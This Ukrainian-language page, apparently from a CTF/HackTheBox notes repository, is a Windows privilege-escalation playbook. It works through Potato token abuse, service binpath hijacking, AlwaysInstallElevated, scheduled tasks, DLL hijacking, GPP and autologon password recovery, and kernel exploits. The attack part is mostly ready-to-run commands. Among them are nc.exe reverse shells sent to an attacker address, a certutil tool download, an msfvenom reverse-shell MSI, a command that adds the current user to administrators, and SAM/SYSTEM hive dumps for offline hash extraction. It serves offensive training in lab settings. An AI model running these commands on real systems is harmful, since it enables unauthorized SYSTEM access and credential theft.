# Windows: Privilege Escalation

**Навіщо:** є обмежений shell (IIS/service-акаунт, звичайний юзер) → мета **SYSTEM** або **Administrator**. Нижче — підтверджені CTF/HTB-вектори за частотою появи.
**Коли:** після [enumeration](01-enumeration.md); `whoami /priv` і `whoami /groups` зібрано.
← [README](README.md) · [fundamentals](00-fundamentals.md) · [credentials](04-credentials.md) · [cheatsheet](cheatsheet.md)

> **Порядок перевірки (від найчастішого):** `whoami /priv` (SeImpersonate/SeBackup/SeDebug) → права на сервіси (`accesschk`) → unquoted paths → AlwaysInstallElevated → scheduled tasks → GPP/autologon креди → DLL hijack → kernel (останнє). winPEAS робить усе це автоматично й підсвічує — але розумій кожен вектор, щоб діяти за підсвіткою.

---

<a id="1-зловживання-привілеями-токена"></a>
## 1. Зловживання привілеями токена (SeImpersonate → Potato) ⭐ найчастіше
**Коли:** `whoami /priv` містить **SeImpersonatePrivilege** або **SeAssignPrimaryTokenPrivilege** (типово у `iis apppool\*`, `mssql`, `nt service\*`, після foothold через веб/БД).

**Що перевірити:**
```cmd
whoami /priv | findstr /i "impersonate assignprimary"
```
**Передумови:** (1) залити сам Potato-бінар (`PrintSpoofer64.exe` / `GodPotato-NET4.exe`) з [tools/windows](../tools/README.md) через [file-transfer](../02-workflows/file-transfer.md); (2) для **revshell**-варіанта додатково залити `nc.exe` (теж у tools/windows) й підняти listener `nc -lvnp 4444` на VPN-адресі; (3) GodPotato потребує відповідного **.NET** на цілі. **Інтерактивний `-i -c cmd` nc.exe НЕ потребує** — одразу дає SYSTEM-shell у поточному терміналі.
```cmd
:: спершу (приклад доставки): certutil -urlcache -f http://10.8.N.x:8000/PrintSpoofer64.exe C:\temp\ps.exe
:: PrintSpoofer — найшвидший, працює Win10/Server 2016-2019
C:\temp\ps.exe -i -c cmd                      :: інтерактивний SYSTEM-shell (nc не потрібен)
C:\temp\ps.exe -c "C:\temp\nc.exe 10.8.N.x 4444 -e cmd"   :: revshell від SYSTEM (nc.exe має бути залитий)

:: GodPotato — ширша сумісність (Win8-11 / Server 2012-2022), потрібен .NET
C:\temp\gp.exe -cmd "cmd /c whoami"           :: перевірка → nt authority\system
C:\temp\gp.exe -cmd "C:\temp\nc.exe 10.8.N.x 4444 -e cmd"
```
**Як інтерпретувати:** вивід `nt authority\system` → ти SYSTEM. Далі → [flag-hunt](cheatsheet.md#пошук-прапорців) + дамп SAM/LSASS ([credentials](04-credentials.md)).
**Що далі:** SYSTEM = кінець локального privesc; у домені SYSTEM на DC = все, на member-хості → дамп кредів → [lateral](06-lateral-postex.md)/[AD](05-active-directory.md).
**Обмеження:** PrintSpoofer потребує запущеного Print Spooler (часто є); на нових білдах Server 2019+/2022 — бери **GodPotato** (використовує DCOM/RPC, не спулер). Якщо один «Potato» не йде — пробуй інший (RoguePotato потребує OXID-резолвера, складніше).
**Приклад:** класичний шлях на багатьох HTB Windows-боксах з веб-foothold → IIS-shell має SeImpersonate → PrintSpoofer/GodPotato → SYSTEM.

**Інші привілеї токена:**
- **SeBackupPrivilege / SeRestorePrivilege** → читати/писати будь-який файл. Копія SAM+SYSTEM → дамп хешів офлайн:
  ```cmd
  reg save HKLM\SAM C:\temp\sam.hiv & reg save HKLM\SYSTEM C:\temp\system.hiv
  :: на Kali: impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL
  ```
- **SeDebugPrivilege** → дамп LSASS (креди в пам'яті) → [credentials](04-credentials.md#lsass).
- **SeTakeOwnershipPrivilege** → `takeown`/`icacls` на чужий файл → перезапис.

---

## 2. Слабкі права на сервіс (можна перезаписати конфіг) ⭐
**Коли:** сервіс стартує від **LocalSystem**, а поточний юзер має право **змінити** його (binpath). Найчастіший «класичний» privesc.

**Що перевірити (accesschk з tools/windows/):**
```cmd
:: сервіси, де група Users має право запису/зміни
accesschk64.exe /accepteula -uwcqv "Users" *
accesschk64.exe /accepteula -uwcqv "Authenticated Users" *
:: конкретний сервіс
accesschk64.exe /accepteula -wuvc <ServiceName>
```
Шукати в виводі: `SERVICE_CHANGE_CONFIG` або `SERVICE_ALL_ACCESS` для твоєї групи.
**Експлуатація:**
```cmd
sc qc <svc>                                   :: подивитись поточний BINARY_PATH_NAME, START_NAME=LocalSystem?
sc config <svc> binpath= "C:\temp\nc.exe 10.8.N.x 4444 -e cmd" obj= LocalSystem
net stop <svc> & net start <svc>              :: тригер (listener уже слухає)
:: якщо сервіс не рестартується вручну — додати юзера в адміни як payload:
sc config <svc> binpath= "cmd /c net localgroup administrators <me> /add"
```
**Інтерпретація/далі:** після рестарту payload виконається від SYSTEM → revshell або ти в Administrators.
**Обмеження:** `net start` може бути заборонений не-адміну; тоді шукай сервіс з `START_TYPE: AUTO` і чекай/тригер перезавантаженням (у CTF рідко). **Правила: сервіс не ламати** — payload має або швидко відпрацювати, або відновити оригінальний binpath після.

---

<a id="3-помилки-конфігурації-сервісів"></a>
## 3. Помилки конфігурації сервісів (бінар/шлях)
### 3a. Записуваний бінар сервісу
**Коли:** сам `.exe` сервісу лежить у теці, куди ти можеш писати.
```cmd
accesschk64.exe /accepteula -quvw "C:\Path\To\service.exe"   :: FILE_ALL_ACCESS/WRITE для Users?
```
→ підмінити `.exe` своїм (зберегти оригінал), рестарт → SYSTEM. Відновити після.

### 3b. Unquoted service path
**Коли:** `BINARY_PATH_NAME` містить **пробіл** і **не в лапках**, напр. `C:\Program Files\My App\svc.exe`. Windows спробує `C:\Program.exe`, потім `C:\Program Files\My.exe` ...
```cmd
wmic service get Name,PathName,StartMode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```
**Експлуатація:** якщо маєш запис у `C:\` або `C:\Program Files\` (рідко) або у проміжну теку — покласти `My.exe`/`Program.exe` → рестарт.
**Обмеження (важливо):** сам по собі unquoted path **нічого не дає** — потрібен **запис у теку перед пробілом**. На практиці `C:\` і `C:\Program Files\` для не-адміна закриті, тож чистий unquoted спрацьовує **рідко**; значно частіше privesc іде через **записувану теку/бінар сервісу** (§3a) або **права на конфіг** (§2). Перевіряй запис на КОЖЕН сегмент шляху й не став на unquoted, поки не підтвердив writable-теку:
```cmd
accesschk64.exe /accepteula -uwdq "C:\" "C:\Program Files\"   :: є (W)/(M) для Users/Everyone?
```
Немає запису в жоден сегмент → вектор «на папері», пропускай.

---

## 4. AlwaysInstallElevated
**Коли:** обидва ключі реєстру `=1` (політика дозволяє будь-кому ставити MSI від SYSTEM).
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
**Інтерпретація:** якщо **обидва** = `0x1` → вразливо (один з двох — ні).
**Експлуатація:**
```bash
# на Kali — згенерувати MSI:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.N.x LPORT=4444 -f msi -o evil.msi
```
```cmd
:: на цілі (залити evil.msi):
msiexec /quiet /qn /i C:\temp\evil.msi
```
**Обмеження:** потрібен `msfvenom` на Kali (є) й доставка MSI. Якщо лише один ключ `=1` — не працює.

---

## 5. Scheduled tasks
**Коли:** таск запускається від SYSTEM/адміна й виконує скрипт/бінар, який ти можеш змінити.
```cmd
schtasks /query /fo LIST /v | findstr /i "TaskName Run-As Task-To-Run Next-Run"
accesschk64.exe /accepteula -quvw "C:\Path\scripted.ps1"   :: чи можу писати в ціль таска?
```
**Експлуатація:** дописати команду у скрипт таска → спрацює при наступному запуску (почекати цикл). 
**Обмеження:** інтервал таска може бути довгим; у 60-хв раунді перевір `Next-Run`. Якщо далеко — не ставка.

---

## 6. Writable directories / PATH / DLL hijacking
**Коли:** сервіс/додаток шукає DLL у теці, куди ти пишеш (помилка завантаження DLL) або `%PATH%` містить записувану теку раніше за системну.
```cmd
:: записувані теки у PATH
for %A in ("%PATH:;=" "%") do @echo %~A & icacls %~A 2>nul | findstr /i "(W) (M) (F) Users Everyone"
```
Пошук відсутніх DLL — через **ProcMon** (Sysinternals, GUI; у headless-CTF рідко) або знання додатка.
**Обмеження:** DLL hijack — зазвичай **не** перший вибір (треба знати, яку DLL і куди кладе додаток; потрібна скомпільована DLL). Лиши на потім, якщо прості вектори не дали.

---

## 7. Креди як шлях до privesc (GPP / autologon / конфіги)
Часто «privesc» = просто знайдений пароль адміна. Деталі збору — [credentials](04-credentials.md); тут найшвидші:
```cmd
:: autologon (пароль у реєстрі відкритим текстом)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUserName DefaultPassword"
:: збережені креди
cmdkey /list
:: GPP cpassword (у домені — класика HTB Active): шукати в SYSVOL
findstr /S /I cpassword \\<domain>\SYSVOL\*.xml
```
**GPP:** `cpassword` шифрується **публічним AES-ключем Microsoft** → дешифрується офлайн:
```bash
gpp-decrypt '<cpassword-base64>'      # на Kali
```
**Інтерпретація:** знайдений пароль → `runas`/RunasCs під тим юзером, або PtH якщо хеш.
```cmd
RunasCs.exe <user> <pass> "cmd /c whoami" -l 3
RunasCs.exe <user> <pass> cmd -r 10.8.N.x:4444      :: revshell під іншим юзером
```
**Приклад:** HTB **Active** — GPP `Groups.xml` у SYSVOL містить cpassword сервіс-акаунта → gpp-decrypt → доступ → далі Kerberoast до DA.

---

## 8. Kernel exploits (останній варіант)
**Коли:** нічого з вище, стара непатчена ОС.
```cmd
systeminfo > sysinfo.txt
:: на Kali: windows-exploit-suggester / wesng проти sysinfo.txt
```
```bash
wesng sysinfo.txt      # або: windows-exploit-suggester.py --database xlsx --systeminfo sysinfo.txt
```
**Обмеження:** kernel-експлойти **нестабільні** — можуть вронити хост. У KotH це **порушення** (не ламати машину). Запускати лише якщо впевнений і немає альтернатив; у CTF privesc майже завжди йде через misconfig, не kernel.

---

## Деке'-чеклист (швидко)
```
whoami /priv      → SeImpersonate? → PrintSpoofer/GodPotato  (вектор №1)
                  → SeBackup/SeRestore/SeDebug? → читання SAM / дамп LSASS
accesschk -uwcqv Users *   → сервіс із CHANGE_CONFIG → sc config binpath
wmic ... unquoted          → запис у теку шляху? → підміна
reg AlwaysInstallElevated  → обидва =1 → evil.msi
schtasks /v                → таск від SYSTEM із записуваним скриптом
GPP/autologon/cmdkey       → пароль/хеш → RunasCs / PtH
systeminfo + wesng         → kernel (лише як крайній і безпечний)
```

## Джерела
- HackTricks — Windows Local Privilege Escalation (повний чеклист): https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html
- HackTricks — RoguePotato/PrintSpoofer/JuicyPotato: https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html
- PayloadsAllTheThings — Windows Privilege Escalation: https://github.com/swisskyrepo/PayloadsAllTheThings
- itm4n (PrintSpoofer, автор): https://github.com/itm4n/PrintSpoofer · GodPotato: https://github.com/BeichenDream/GodPotato
- RunasCs: https://github.com/antonioCoco/RunasCs
